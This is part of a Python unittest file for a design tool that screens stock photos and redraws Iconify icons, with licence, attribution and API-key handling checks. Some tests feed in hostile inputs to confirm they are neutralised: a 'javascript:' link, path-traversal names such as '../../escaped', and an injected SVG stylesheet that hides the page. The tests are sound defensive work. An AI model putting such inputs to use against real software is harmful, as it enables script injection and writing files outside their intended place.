        rej, _, _ = il.screen_photo({"title": "Coffee shop logo wall", "tags": []})
        self.assertTrue(any("brand" in r for r in rej))
        rej, _, _ = il.screen_photo({"title": "Bulk carrier at anchor", "tags": ["Northwind Lines"]}, avoid=["Northwind Lines"])
        self.assertTrue(any("competitor" in r for r in rej))
        rej, look, hint = il.screen_photo({"title": "Container ship Zephyrine at dusk", "tags": []}, words=["container", "ship"])
        self.assertEqual(rej, [])
        self.assertTrue(any("Zephyrine" in x for x in look))
        self.assertTrue(any("container often carries" in x for x in look))
        self.assertEqual(hint, "warm")

    def test_parsers_and_keys(self):
        ov = {"results": [{"id": "9", "title": "Dock at noon", "url": "https://x/9.jpg", "foreign_landing_url": "https://x/9", "license": "cc0",
                           "filetype": "jpg", "width": 3000, "height": 2000, "creator": "Ann", "thumbnail": "https://x/t9.jpg"}]}
        c = il.parse_openverse_photo(json.dumps(ov), self.sources["openverse"])[0]
        self.assertEqual((c["id"], c["licence"], c["width"]), ("openverse:9", "CC0", 3000))
        cm = {"query": {"pages": [{"pageid": 5, "title": "File:Quay.jpg", "imageinfo": [{"mime": "image/jpeg", "width": 800, "height": 600,
              "thumbwidth": 1920, "thumbheight": 1440, "thumburl": "https://x/q.jpg", "descriptionurl": "https://x/q",
              "extmetadata": {"LicenseShortName": {"value": "CC BY 4.0"}}}]}]}}
        c = il.parse_commons_photo(json.dumps(cm), self.sources["commons"])[0]
        self.assertEqual((c["width"], c["download"]), (800, "https://x/q.jpg"))  # a small original is not reported as 1920 px
        px = {"photos": [{"id": 7, "url": "https://www.pexels.com/photo/7/", "photographer": "Bo", "alt": "Office by a window",
                          "width": 4000, "height": 3000, "src": {"large2x": "https://images.pexels.com/7.jpg", "medium": "https://images.pexels.com/7m.jpg"}}]}
        c = il.parse_pexels(json.dumps(px), self.sources["pexels"])[0]
        self.assertEqual((c["id"], c["author"], c["licence"]), ("pexels:7", "Bo", self.sources["pexels"]["licence"]))
        a = mock.Mock(limit=20, orientation=None)
        with mock.patch.dict(os.environ, {"PEXELS_API_KEY": ""}):
            with tempfile.TemporaryDirectory() as tmp, contextlib.chdir(tmp) if hasattr(contextlib, "chdir") else contextlib.nullcontext():
                self.assertEqual(il.req_pexels(self.sources["pexels"], "office", a), [])
        with mock.patch.dict(os.environ, {"PEXELS_API_KEY": "secret-key"}):
            (url, key_env), = il.req_pexels(self.sources["pexels"], "office", a)
            line = il.fetch_line(url, "/tmp/x.json", key_env)
        self.assertIn("$PEXELS_API_KEY", line)
        self.assertNotIn("secret-key", line)                                 # a key is never printed
        seen = []

        class Resp:
            def geturl(self): return url
            def read(self, n): return b"{}"
            def __enter__(self): return self
            def __exit__(self, *a): return False
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(os.environ, {"PEXELS_API_KEY": "secret-key"}), \
                mock.patch.object(il.urllib.request, "urlopen", side_effect=lambda req, timeout: seen.append(req) or Resp()):
            il.http_get(url, Path(tmp) / "r.json", key_env=key_env)
        self.assertEqual(seen[0].unredirected_hdrs.get("Authorization"), "secret-key")  # sent, but never on a redirect
        self.assertNotIn("Authorization", seen[0].headers)

    def test_add_review_check_and_credits(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp) / "opendesigner" / "research" / "photos")
            f = Path(tmp, "dock.jpg")
            f.write_bytes(JPEG)
            Path(tmp, "note.txt").write_text("not a photo")
            with self.assertRaises(SystemExit):
                run(["--dir", d, "photos", "add", str(Path(tmp, "note.txt")), "--source", "unsplash"])
            with self.assertRaises(SystemExit):
                run(["--dir", d, "photos", "add", str(f), "--ai"])           # --ai needs --tool
            out = run(["--dir", d, "photos", "add", str(f), "--source", "unsplash", "--url", "https://unsplash.com/photos/x", "--name", "dock"])
            self.assertIn("Unsplash+", out)
            run(["--dir", d, "photos", "add", str(f), "--ai", "--tool", "an image model", "--name", "render"])
            led = {e["name"]: e for e in json.loads(Path(d, "ledger.json").read_text())["items"]}
            self.assertEqual(led["dock"]["brand_check"], "pending")
            self.assertTrue(led["render"]["ai_generated"])
            self.assertEqual(il.main(["--dir", d, "photos", "check"]), 1)     # nobody has looked yet
            run(["--dir", d, "photos", "review", "dock", "--brands", "none", "--grade", "natural", "--alt", "A quiet dock"])
            run(["--dir", d, "photos", "review", "render", "--brands", "none", "--grade", "natural", "--caption", "AI-generated image"])
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                self.assertEqual(il.main(["--dir", d, "photos", "check"]), 1)
            self.assertIn("made with AI", buf.getvalue())
            run(["--dir", d, "photos", "review", "render", "--caption", ""])
            page = Path(tmp, "index.html")
            page.write_text('<figure><img src="dock.jpg" alt=""><figcaption>Photo: AI generated</figcaption></figure>')
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(il.main(["--dir", d, "photos", "check"]), 0)
                self.assertEqual(il.main(["--dir", d, "photos", "check", "--page", str(page)]), 1)
            credits = Path(d, "CREDITS.md").read_text()
            self.assertIn("| dock |", credits)
            self.assertIn("## Made with AI", credits)
            self.assertNotIn("| render |", credits)
            run(["--dir", d, "photos", "review", "dock", "--brands", "found"])
            self.assertEqual(json.loads(Path(d, "ledger.json").read_text())["items"][0]["status"], "rejected")

    def test_review_fixes_from_the_fresh_eyes_pass(self):
        page = ('<p>We never use AI generated photos.</p><figure><img src="a.jpg" alt=""><figcaption><em>AI-generated image</em>'
                '</figcaption></figure><div class="photo-caption">Generated with Midjourney</div><img src="b.jpg" alt="Dock at noon">')
        found = [w for w, t in il.image_texts(page) if il.AI_CAPTION.search(t)]
        self.assertEqual(found, ["figure", "a caption"])                         # the paragraph is not about an image
        with mock.patch.object(il, "http_get") as get:
            il.fetch_all([("https://a.example/x", "/tmp/x", None)], False)
        self.assertEqual(get.call_args.kwargs["limit"], il.MAX_BYTES)            # a short tuple keeps the size cap
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp) / "photos")
            f = Path(tmp, "a.jpg")
            f.write_bytes(JPEG)
            run(["--dir", d, "photos", "add", str(f), "--source", "unsplash", "--name", "a"])
            run(["--dir", d, "photos", "review", "a", "--brands", "found"])
            run(["--dir", d, "photos", "review", "a", "--brands", "none", "--grade", "natural"])   # cropped, looked at again
            e = json.loads(Path(d, "ledger.json").read_text())["items"][0]
            self.assertEqual((e["status"], e["brand_check"]), ("candidate", "clear"))
            c = {"id": "openverse:9", "source": "openverse", "title": "Midjourney: dock", "licence": "CC BY 2.0", "page": "javascript:x",
                 "ai_suspected": True}
            e = il.photo_entry("dock", c, "attribution", self.sources, "dock.jpg")
            self.assertTrue(e["ai_generated"])                                    # --force never hides what the words said
            self.assertEqual(e["page"], "")
            pd = Path(tmp) / "p2"
            with mock.patch.dict(os.environ, {"PEXELS_API_KEY": ""}):
                run(["--dir", str(pd), "photos", "search", "warehouse", "--offline", "--source", "openverse"])
                for r in json.loads((pd / "photo-requests.json").read_text())["requests"]:
                    Path(r["save_as"]).write_text('{"results": [{"id": "w", "title": "Warehouse", "license": "cc0", "url": "https://x/w.jpg"}]}')
                out = run(["--dir", str(pd), "photos", "search", "office desk", "--reuse", "--offline", "--source", "openverse"])
            self.assertIn("0 usable photo(s) of 0", out)                         # another subject never reads old answers

    def test_search_offline_and_fetch(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "opendesigner" / "research" / "photos"
            users = d.parent / "users.json"
            users.parent.mkdir(parents=True)
            users.write_text(json.dumps({"market": {"competitors": [{"name": "Northwind Lines"}]}}))
            with mock.patch.dict(os.environ, {"PEXELS_API_KEY": ""}):
                out = run(["--dir", str(d), "photos", "search", "bulk carrier", "--offline"])
            self.assertIn("curl -sL", out)
            self.assertIn("pexels: no key", out)
            self.assertIn("unsplash.com/s/photos/bulk%20carrier", out)
            ov = {"results": [
                {"id": "1", "title": "Bulk carrier at anchor, morning", "url": "https://x/1.jpg", "foreign_landing_url": "https://x/1", "license": "cc0",
                 "filetype": "jpg", "width": 3000, "height": 2000, "creator": "Ann"},
                {"id": "2", "title": "Midjourney bulk carrier", "url": "https://x/2.jpg", "foreign_landing_url": "https://x/2", "license": "by",
                 "license_version": "2.0", "filetype": "jpg", "width": 1024, "height": 576, "creator": "Bo"},
                {"id": "3", "title": "Northwind Lines bulk carrier", "url": "https://x/3.jpg", "foreign_landing_url": "https://x/3", "license": "cc0",
                 "filetype": "jpg", "width": 3000, "height": 2000, "creator": "Cy"}]}
            reqs = json.loads((d / "photo-requests.json").read_text())["requests"]
            self.assertEqual({r["source"] for r in reqs}, {"openverse", "commons"})
            for r in reqs:
                Path(r["save_as"]).write_text(json.dumps(ov) if r["source"] == "openverse" else '{"query": {"pages": []}}')
            with mock.patch.dict(os.environ, {"PEXELS_API_KEY": ""}):
                out = run(["--dir", str(d), "photos", "search", "bulk carrier", "--reuse", "--offline"])
            self.assertIn("1 usable photo(s) of 3", out)
            self.assertIn("Rejected 2", out)
            out = run(["--dir", str(d), "photos", "fetch", "openverse:2", "openverse:1", "--offline"])
            self.assertIn("skip openverse:2", out)
            dl = d / "downloads" / "openverse-1"
            dl.write_bytes(JPEG)
            out = run(["--dir", str(d), "photos", "fetch", "openverse:1", "--offline"])
            self.assertIn("fetched", out)
            e = json.loads((d / "ledger.json").read_text())["items"][0]
            self.assertEqual((e["file"].endswith(".jpg"), e["brand_check"], e["verdict"]), (True, "pending", "ok"))


# A few invented owner icons: a 40-unit grid, a filled circle badge, a 1.5-unit line in a 20-unit glyph box (issue 50).
BADGE = '<circle cx="20" cy="20" r="20" fill="#E8EEFC"/>'
OWN_PLUS = ('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40">' + BADGE +
            '<path d="M12 20h16M20 12v16" fill="none" stroke="#1F3A8A" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>')
OWN_CLOCK = ('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40">' + BADGE +
             '<g fill="none" stroke="#1F3A8A" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'
             '<circle cx="20" cy="20" r="8"/><path d="M20 16v4l3 2"/></g></svg>')
# The same line drawn as a filled ring (strokes outlined on export), with the arc flags run together as SVGO writes them.
OWN_RING = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><path fill="#1F3A8A" fill-rule="evenodd" '
            'd="M20 11.25a8.75 8.75 0 110 17.5a8.75 8.75 0 110-17.5zM20 12.75a7.25 7.25 0 100 14.5a7.25 7.25 0 100-14.5z"/></svg>')
ION_INFO = {"ion": {"name": "IonIcons", "total": 1357, "author": {"name": "Ben Sperry", "url": "https://github.com/ionic-team/ionicons"},
                    "license": {"title": "MIT", "spdx": "MIT", "url": "https://github.com/ionic-team/ionicons/blob/main/LICENSE"}}}
ION_ICONS = {"prefix": "ion", "width": 512, "height": 512, "icons": {
    "wallet-outline": {"body": '<path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" '
                             'd="M48 336h416M128 176h256M256 48v288"/>'},
    "wallet": {"body": '<path fill="currentColor" d="M48 336h416v32H48z"/>'}}}


def fulfil(out, payloads):
    """Stand in for the agent: save each requested download (from the printed curl lines) with a canned body."""
    for url, dest in re.findall(r'"(https://[^"]+)" -o "([^"]+)"', out):
        body = next(v for k, v in payloads.items() if k in url)
        Path(dest).parent.mkdir(parents=True, exist_ok=True)
        Path(dest).write_text(json.dumps(body))


class Icons(unittest.TestCase):
    """A few of the owner's icons, extended with open-library glyphs drawn in the same construction (GitHub issue 50)."""

    def owner(self, tmp, *svgs):
        files = []
        for i, svg in enumerate(svgs):
            files.append(Path(tmp, f"own-{i}.svg"))
            files[-1].write_text(svg)
        return [str(f) for f in files]

    def test_paths_and_filled_outlines(self):
        xs = [p[0] for sp in il.path_subpaths("M0 0a5 5 0 110 10") for p in sp]  # flags run together
        self.assertAlmostEqual(max(xs), 5, delta=0.05)
        self.assertEqual(len(il.path_subpaths("M0 0h10v10zM20 20l5 5")), 2)
        con = il.measure_root(il.sanitize(OWN_RING)[0])
        self.assertEqual((con["style"], con["stroked"]), ("outline", False))
        self.assertAlmostEqual(con["line"], 1.5, delta=0.05)
        self.assertTrue(con["line_how"].startswith("estimated"))
        self.assertAlmostEqual(il.parse_transform("translate(2 3) scale(2)")[0], 2)
        self.assertEqual(il.xform(il.parse_transform("rotate(90)"), (1, 0))[1], 1)

    def test_measure_reads_the_construction(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            out = run(["--dir", d, "icons", "measure", *self.owner(tmp, OWN_PLUS, OWN_CLOCK)])
            con = json.loads(Path(d, "construction.json").read_text())
            self.assertEqual((con["style"], con["line"], con["caps"], con["joins"], con["colour"]), ("outline", 1.5, "round", "round", "#1F3A8A"))
            self.assertEqual((con["centre"], con["sizes"], con["container"][0]["fill"]), ([20, 20], [40], "#E8EEFC"))
            self.assertEqual((con["glyph_box"], con["glyph_box_how"]), (19.2, "estimated"))  # 16 units of drawing / (20/24)
            self.assertIn("circle badge", out)
            self.assertIn("--glyph-box", out)                                                 # an estimate says how to correct it
            out = run(["--dir", d, "icons", "measure", *self.owner(tmp, OWN_PLUS, OWN_CLOCK), "--glyph-box", "20"])
            self.assertIn("raw.iconStroke 1.8 --set-by asset", out)                           # 1.5 x 24 / 20
            nested = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40">' + BADGE + '<svg x="10" y="10" width="20" height="20" '
                      'viewBox="0 0 24 24"><path d="M4 12h16" stroke="#1F3A8A" stroke-width="1.8" fill="none"/></svg></svg>')
            run(["--dir", d, "icons", "measure", *self.owner(tmp, nested)])
            con = json.loads(Path(d, "construction.json").read_text())
            self.assertEqual((con["glyph_box"], con["glyph_box_how"], con["line"]), (20, "the box drawn in your files", 1.5))

    def test_sets_rank_by_construction(self):
        data = json.loads(il.SOURCES.read_text())
        ok = next(s for s in data["sources"] if s["id"] == "iconify")["licences_ok"]
        sets = data["icon_sets"]
        self.assertGreaterEqual(len(sets), 10)
        for s in sets:
            self.assertTrue({"prefix", "name", "grid", "weight", "stroked", "live", "licence", "licence_url", "total"} <= set(s), s.get("prefix"))
            self.assertIn(s["licence"], ok)
            self.assertTrue(s["licence_url"].startswith("https://"))
        con = {"style": "outline", "weight": 0.0625, "caps": "round", "joins": "round"}
        top = il.rank_icon_sets(con, sets)[0]
        self.assertTrue(top["stroked"])
        self.assertAlmostEqual(top["weight"], 0.0625, delta=0.001)
        solid = il.rank_icon_sets({"style": "solid"}, sets)
        self.assertIn("solid", solid[0])
        self.assertIn("no solid glyphs", " ".join(solid[-1]["why"]))

    def test_fetch_draws_the_glyph_in_the_owner_construction(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            self.assertRaises(SystemExit, run, ["--dir", d, "icons", "fetch", "wallet", "--set", "ion"])  # measure first
            run(["--dir", d, "icons", "measure", *self.owner(tmp, OWN_PLUS, OWN_CLOCK), "--glyph-box", "20"])
            self.assertRaises(SystemExit, run, ["--dir", d, "icons", "fetch", "../wallet", "--set", "ion"])
            out = run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion", "--offline"])
            self.assertIn("https://api.iconify.design/collections?prefixes=ion", out)
            self.assertIn("ion.json?icons=wallet,wallet-outline\"", out)                            # the outline glyph first; plain only if drawn alike
            fulfil(out, {"collections": ION_INFO, "ion.json": ION_ICONS})
            out = run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion"])
            self.assertIn("drew wallet.svg <- ion:wallet-outline", out)
            svg = Path(d, "wallet.svg").read_text()
            self.assertIn('stroke-width="38.4"', svg)                                          # 1.5 / (20/512), as in the issue
            self.assertIn("scale(0.0390625)", svg)
            self.assertIn('fill="#E8EEFC"', svg)                                               # the owner's badge
            self.assertNotIn("currentColor", svg)
            self.assertIn('stroke="#1F3A8A"', svg)
            self.assertIn('class="odi-wallet"', svg)                                             # ids and classes scoped to this icon
            self.assertTrue(Path(d, "src", "wallet.svg").exists())                               # the untouched original
            e = json.loads(Path(d, "ledger.json").read_text())["items"][0]
            self.assertEqual((e["licence_spdx"], e["verdict"], e["status"]), ("MIT", "ok", "candidate"))
            self.assertEqual(e["attribution"], "wallet-outline from IonIcons by Ben Sperry, MIT")
            next(Path(d, "downloads").glob("ion-info-*.json")).write_text(json.dumps({"ion": {**ION_INFO["ion"], "license": {"title": "GPL", "spdx": "GPL-3.0"}}}))
            with self.assertRaises(SystemExit) as cm:
                run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion"])
            self.assertIn("not on the allowed list", str(cm.exception))

    def test_sheet_and_keep(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            run(["--dir", d, "icons", "measure", *self.owner(tmp, OWN_PLUS, OWN_CLOCK), "--glyph-box", "20", "--sizes", "20"])
            fulfil(run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion", "--offline"]), {"collections": ION_INFO, "ion.json": ION_ICONS})
            run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion"])
            self.assertIn('width="40"', Path(d, "wallet.svg").read_text())                      # the originals' own size, not the 20 px row
            page = Path(run(["--dir", d, "icons", "sheet"]).strip()).read_text()
            for words in ("Yours", "New, drawn the same way", "Together", "20 px", "40 px", "data:image/svg+xml;base64,", "IonIcons · MIT"):
                self.assertIn(words, page)
            self.assertNotIn("http://", page.replace("http://www.w3.org", ""))                  # nothing remote on the sheet
            app = Path(tmp, "app", "icons")
            out = run(["--dir", d, "icons", "keep", "wallet", "--to", str(app)])
            self.assertTrue((app / "wallet.svg").exists())
            self.assertIn("hooks.H-icons.status", out)
            self.assertIn("2 of the owner's icons plus 1 glyphs from IonIcons (MIT)", out)
            credits = Path(d, "ATTRIBUTION.md").read_text()
            self.assertIn("# Icon credits and licences", credits)
            self.assertIn("| wallet (unassigned) | [iconify]", credits)

    def test_review_fixes(self):
        """The fresh-eyes review of issue 50's first draft: each case that went wrong then."""
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            # paint the badge takes from the root, a class or a gradient stays on the copied badge
            figma = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="19.25" '
                     'stroke="#C9D5F0" stroke-width="1.5"/><path d="M13 20h14M20 13v14" stroke="#1F3A8A" stroke-width="1.5"/></svg>')
            run(["--dir", d, "icons", "measure", *self.owner(tmp, figma, figma)])
            ring = json.loads(Path(d, "construction.json").read_text())["container"][0]["xml"]
            self.assertIn('fill="none"', ring)
            classy = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><style>.b{fill:#E8EEFC}</style><defs><linearGradient id="g">'
                      '<stop offset="0" stop-color="#E8EEFC"/></linearGradient></defs><circle class="b" cx="20" cy="20" r="20"/>'
                      '<circle cx="20" cy="20" r="19" fill="url(#g)"/><path d="M13 20h14" stroke="#1F3A8A" stroke-width="1.5"/></svg>')
            run(["--dir", d, "icons", "measure", *self.owner(tmp, classy, classy), "--glyph-box", "20"])
            con = json.loads(Path(d, "construction.json").read_text())
            self.assertIn('fill="#E8EEFC"', con["container"][0]["xml"])
            self.assertTrue(any("linearGradient" in x for c in con["container"] for x in c["defs"]))
            glyphs = {"prefix": "ion", "width": 512, "height": 512, "icons": {
                "wallet-outline": {"body": '<style>svg,body{display:none}</style><path fill="none" stroke="currentColor" stroke-width="32" d="M48 336h416"/>'},
                "receipt": {"body": '<path fill="currentColor" d="M48 48h416v416H48z"/>'}}}
            fulfil(run(["--dir", d, "icons", "fetch", "wallet", "receipt", "--set", "ion", "--name", "../../escaped", "--offline"]),
                   {"collections": ION_INFO, "ion.json": glyphs})
            out = run(["--dir", d, "icons", "fetch", "wallet", "receipt", "--set", "ion"])
            self.assertIn("skip receipt: ion has no receipt-outline, and its receipt is solid", out)  # never the other style's glyph
            svg = Path(d, "wallet.svg").read_text()
            self.assertNotIn("display:none", svg)                                              # a glyph's stylesheet is dropped
            self.assertIn('url(#odi-wallet-g)', svg)
            self.assertIn('id="odi-wallet-g"', svg)
            fulfil(run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion", "--name", "../../escaped", "--offline"]),
                   {"collections": ION_INFO, "ion.json": glyphs})
            run(["--dir", d, "icons", "fetch", "wallet", "--set", "ion", "--name", "../../escaped"])
            self.assertTrue(Path(d, "escaped.svg").exists())                                   # --name is a slug, never a path
            self.assertFalse(Path(tmp, "escaped.svg").exists())
            with self.assertRaises(SystemExit) as cm:
                run(["--dir", d, "icons", "fetch", "home-filled", "--set", "tabler"])        # tabler's solid glyph for outline icons
            self.assertIn("solid glyphs of tabler", str(cm.exception))
            app = Path(tmp, "app")
            app.mkdir()
            (app / "wallet.svg").write_text("<svg/>")
            self.assertRaises(SystemExit, run, ["--dir", d, "icons", "keep", "wallet", "--to", str(app)])   # never overwrites
            self.assertEqual((app / "wallet.svg").read_text(), "<svg/>")
            own = self.owner(tmp, classy)[0]
            Path(d, "own-0.svg").write_text(Path(d, "wallet.svg").read_text())
            led = json.loads(Path(d, "ledger.json").read_text())
            led["items"].append({**led["items"][0], "name": "own-0", "file": "own-0.svg"})
            Path(d, "ledger.json").write_text(json.dumps(led))
            con = json.loads(Path(d, "construction.json").read_text())
            Path(d, "construction.json").write_text(json.dumps({**con, "files": [own]}))
            with self.assertRaises(SystemExit) as cm:
                run(["--dir", d, "icons", "keep", "own-0", "--to", tmp, "--force"])
            self.assertIn("owner's own icons", str(cm.exception))

    def test_icons_without_a_badge(self):
        """A plain 24-unit set: the glyph box is the grid, and one large circle in one icon is not a badge."""
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            line = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'
            plain = [line + '<path d="M3 12h18M12 3v18"/></svg>', line + '<path d="M4 6h16M4 12h16M4 18h16"/></svg>',
                     line + '<path d="M5 5l14 14M19 5L5 19"/></svg>', line + '<circle cx="12" cy="12" r="11"/><path d="M8 12l3 3 5-6"/></svg>']
            out = run(["--dir", d, "icons", "measure", *self.owner(tmp, *plain)])
            con = json.loads(Path(d, "construction.json").read_text())
            self.assertEqual((con["container"], con["glyph_box"], con["weight"]), ([], 24, 0.0625))
            self.assertIn("raw.iconStroke 1.5 ", out)
            self.assertIn("read as part of the glyph", out)
            top = il.rank_icon_sets(con, json.loads(il.SOURCES.read_text())["icon_sets"])[0]
            self.assertAlmostEqual(top["weight"], 0.0625, delta=0.001)
            frame = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="#111"><path d="M0 0h16v16H0zM1 1v14h14V1z"/>'
                     '<path d="M2 4h12v1H2zM3 6h2v2H3zM7 6h2v2H7z M11 6h2v2h-2z M3 10h2v2H3z M7 10h2v2H7zM11 10h2v2h-2z"/></svg>')
            self.assertEqual(il.measure_root(il.sanitize(frame)[0])["container"], [])          # a calendar's frame is not a badge
            sprite = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><path id="p" d="M3 12h18" fill="none" '
                      'stroke="#111" stroke-width="1.5"/></defs><use href="#p"/><use href="#p" y="4"/></svg>')
            m = il.measure_root(il.sanitize(sprite)[0])
            self.assertEqual((m["style"], m["line"]), ("outline", 1.5))                          # <use> is drawn, not skipped
            with self.assertRaises(ValueError):
                il.measure_root(il.sanitize('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"/>')[0])

    def test_find(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp, "opendesigner", "icons"))
            out = run(["--dir", d, "icons", "find", "wallet", "--set", "ion", "--offline"])
            self.assertIn("https://api.iconify.design/search?query=wallet&prefixes=ion&limit=64", out)
            fulfil(out, {"search": {"icons": ["ion:wallet", "ion:wallet-outline", "ion:wallet-sharp", "lucide:sailwallet"]}})
            out = run(["--dir", d, "icons", "find", "wallet", "--set", "ion"])
            self.assertIn('ion, "wallet": wallet-outline', out)                                    # outline names only, this set only


if __name__ == "__main__":
    unittest.main()
